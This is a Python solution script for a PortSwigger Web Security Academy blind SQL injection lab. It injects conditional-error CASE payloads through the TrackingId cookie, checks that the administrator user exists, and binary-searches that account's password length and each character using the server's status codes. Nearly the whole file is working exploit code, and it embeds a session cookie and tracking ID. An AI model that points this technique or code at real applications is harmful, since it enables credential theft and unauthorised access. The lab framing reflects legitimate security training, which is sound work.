# https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors#

import requests

username = "administrator"
ascii_wordlist = list(range(32, 127))

url = "https://0a0a000804382a678088084a007c00cd.web-security-academy.net:443/login"
headers = {"Accept-Language": "es-ES,es;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Referer": "https://0a0a000804382a678088084a007c00cd.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
session = "RpAC8zWrjQdpTFOf5TJkITy1a2eVsNbD"
tracking_id = "tzC7M8MYTa1YjdrF"

def make_miskate_if_sql_not_working(query_sql: str) -> str:
    return f"(SELECT CASE WHEN {query_sql} THEN 1 ELSE 1/0 END FROM dual) = 1 --"

def exists_user(username: str) -> bool:
    cookies = {"TrackingId": f"{tracking_id}' AND {make_miskate_if_sql_not_working(f'(SELECT COUNT(*) FROM users WHERE username = \'{username}\') > 0')}", "session": session}
    response = requests.get(url, headers=headers, cookies=cookies)
    return response.status_code == 200

def password_length_is_greater_than(username: str, index: int) -> int:
    cookies = {"TrackingId": f"{tracking_id}' AND {make_miskate_if_sql_not_working(f'(SELECT LENGTH(password) FROM users WHERE username = \'{username}\') > {index}')}", "session": session}
    response = requests.get(url, headers=headers, cookies=cookies)
    return response.status_code == 200

def character_is_greater_than(username: str, character: str, index: int) -> bool:
    sql_query = make_miskate_if_sql_not_working(f'(SELECT SUBSTRING((SELECT password FROM users WHERE username = \'{username}\'), {index}, 1)) > \'{ord(character)}\'')
    sql_query = make_miskate_if_sql_not_working(f'((SELECT ASCII(SUBSTR(password, {index}, 1)) FROM users WHERE username = \'{username}\')) > {ord(character)}')

    print(sql_query)
    cookies = {"TrackingId": f"{tracking_id}' AND {sql_query}", "session": session}
    response = requests.get(url, headers=headers, cookies=cookies)
    print(response.status_code)

    return response.status_code == 200

def binary_search(values, is_greater_than):
    low = 0
    high = len(values) - 1

    while low < high:
        mid = (low + high) // 2

        if is_greater_than(values[mid]):
            low = mid + 1
        else:
            high = mid

    return values[low]

if not exists_user(username):
    print(f"User {username} does not exist")
    exit()
print(f"User {username} exists")

length = binary_search(range(1, 40), lambda x: password_length_is_greater_than(username, x))
print(f"Password length: {length}")

password = ""
for index in range(1, length + 1):
    print(f"Index: {index}")
    character = binary_search(ascii_wordlist, lambda x: character_is_greater_than(username, chr(x), index))
    print(f"Character: {chr(character)}")
    password += chr(character)
    print(f"Password: {password}")
